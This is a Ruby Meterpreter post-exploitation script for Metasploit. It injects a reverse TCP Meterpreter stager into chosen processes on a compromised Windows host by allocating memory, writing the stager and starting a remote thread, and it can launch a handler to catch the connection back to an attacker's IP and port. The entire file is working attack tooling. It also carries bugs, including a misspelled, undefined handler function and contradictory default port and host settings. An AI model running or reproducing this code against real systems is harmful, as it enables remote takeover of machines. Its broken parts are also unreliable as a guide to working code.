# $Id$
# $Revision$
# Author: Carlos Perez at carlos_perez[at]darkoperator.com
#-------------------------------------------------------------------------------
################## Variable Declarations ##################

@client = client
lhost    = Rex::Socket.source_address("1.2.3.4")
lport    = 4444
lhost    = "127.0.0.1"
pid = nil
proc_name = nil
multi_ip = nil
multi_pid = []
payload_type = "windows/meterpreter/reverse_tcp"
start_handler = nil
@exec_opts = Rex::Parser::Arguments.new(
	"-h"  => [ false,  "Help menu." ],
	"-r"  => [ true,   "The IP of a remote Metasploit listening for the connect back"],
	"-p"  => [ true,   "The port on the remote host where Metasploit is listening (default: 4546)"],
	"-P"  => [ true,   "PID to inject to if process name not used."],
	"-t"  => [ true,   "Name of the process to inject to if PID not given."],
	"-m"  => [ false,  "Start Exploit multi/hadler for return connection"],
	"-pt" => [ true,   "Specify Reverse Connection Meterpreter Payload. Default windows/meterpreter/reverse_tcp"],
	"-mr" => [ true,   "Provide Multiple IP Addresses for Connections separated by comma."],
	"-mp" => [ true,   "Provide Multiple PID for connections separated by comma one per IP."]
)
meter_type = client.platform

################## Function Declarations ##################

# Usage Message Function
#-------------------------------------------------------------------------------
def usage
	print_line "Meterpreter Script for injecting a reverce tcp Meterpreter Payload"
	print_line "in to memory."
	print_line(@exec_opts.usage)
	raise Rex::Script::Completed
end

# Wrong Meterpreter Version Message Function
#-------------------------------------------------------------------------------
def wrong_meter_version(meter = meter_type)
	print_error("#{meter} version of Meterpreter is not supported with this Script!")
	raise Rex::Script::Completed
end

# Function for finding the name of a process given it's PID
#-------------------------------------------------------------------------------
def find_procname(pid)
	name = nil
	@client.sys.process.get_processes.each do |proc|
		if proc['pid'] == pid.to_i
			name = proc['name']
		end
	end
	return name
end

# Find all PID's for a given process name
#-------------------------------------------------------------------------------
def find_pids(name)
	proc_pid = []
	@client.sys.process.get_processes.each do |proc|
		if proc['name'].downcase == name.downcase
			proc_pid << proc['pid']
		end
	end
	return proc_pid
end

# Function for injecting payload in to a given PID
#-------------------------------------------------------------------------------
def inject(target_pid, payload_to_inject)
	print_status("Injecting meterpreter into process ID #{target_pid}")
	begin
		host_process = @client.sys.process.open(target_pid.to_i, PROCESS_ALL_ACCESS)
		raw = payload_to_inject.generate
		mem = host_process.memory.allocate(raw.length + (raw.length % 1024))

		print_status("Allocated memory at address #{"0x%.8x" % mem}, for #{raw.length} byte stager")
		print_status("Writing the stager into memory...")
		host_process.memory.write(mem, raw)
		host_process.thread.create(mem, 0)
		print_good("Successfully injected Meterpreter in to process: #{target_pid}")
	rescue::Exception => e
		print_error("Failed to Inject Payload to #{target_pid}!")
		print_error(e)
	end
end

# Function for Creation of Connection Handler
#-------------------------------------------------------------------------------
def create_multi_handler(payload_to_inject)
	mul = @client.framework.exploits.create("multi/handler")
	mul.share_datastore(payload_to_inject.datastore)
	mul.datastore['WORKSPACE'] = @client.workspace
	mul.datastore['PAYLOAD'] = payload_to_inject
	mul.datastore['EXITFUNC'] = 'process'
	mul.datastore['ExitOnSession'] = true
	print_status("Running payload handler")
	mul.exploit_simple(
		'Payload'  => mul.datastore['PAYLOAD'],
		'RunAsJob' => true
	)

end

# Function for Creating the Payload
#-------------------------------------------------------------------------------
def create_payload(payload_type,lhost,lport)
	print_status("Creating a reverse meterpreter stager: LHOST=#{lhost} LPORT=#{lport}")
	payload = payload_type
	pay = client.framework.payloads.create(payload)
	pay.datastore['LHOST'] = lhost
	pay.datastore['LPORT'] = lport
	return pay
end

################## Main ##################
@exec_opts.parse(args) { |opt, idx, val|
	case opt
	when "-h"
		usage
	when "-r"
		lhost = val
	when "-p"
		lport = val.to_i
	when "-P"
		pid = val.to_i
	when "-t"
		proc_name = val
		pid = find_pids(proc_name)
	when "-m"
		start_handler = true
	when "-pt"
		payload_type = val
	when "-mr"
		multi_ip = val.split(",")
	when "-mp"
		multi_pid = val.split(",")
	end
}

# Check for Version of Meterpreter
wrong_meter_version(meter_type) if meter_type !~ /win32|win64/i
# Create a Multi Handler is Desired
create_multi_hadler(payload_type) if start_handler

# Check to make sure a PID or Program name where provided
puts multi_pid.inspect
puts multi_ip.inspect
if pid or multi_pid.length > 0
	if multi_ip.length > 0
		if multi_ip.length == multi_pid.length
			pid_index = 0
			multi_ip.each do |i|
				payload = create_payload(payload_type,i,lport)
				inject(multi_pid[pid_index],payload)
				select(nil, nil, nil, 5)
				pid_index = pid_index + 1
			end
		else
			print_error("You must provide one PID per IP Address.")
		end
	else
		payload = create_payload(payload_type,lhost,lport)
		inject(pid,payload)
	end
else
	print_error("A PID or Process Name must be provided.")
end
